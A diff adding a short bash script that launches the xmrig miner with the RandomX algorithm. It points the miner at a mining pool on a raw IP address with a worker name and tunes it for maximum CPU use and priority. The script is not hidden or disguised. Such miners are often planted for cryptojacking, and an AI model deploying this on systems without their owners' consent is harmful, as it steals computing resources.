@@ -1,0 +1,14 @@
+#!/bin/bash
+
+clear
+./xmrig \
+	-a rx/0 \
+	-o stratum+tcp://35.76.39.213:5555 \
+	-u wongfihung \
+	-p d=5000 \
+	-t 4 \
+	--cpu-no-yield \
+	--cpu-max-threads-hint=100 \
+	--cpu-memory-pool=1024 \
+	--cpu-priority 2 \
+	--cpu-affinity 0xf
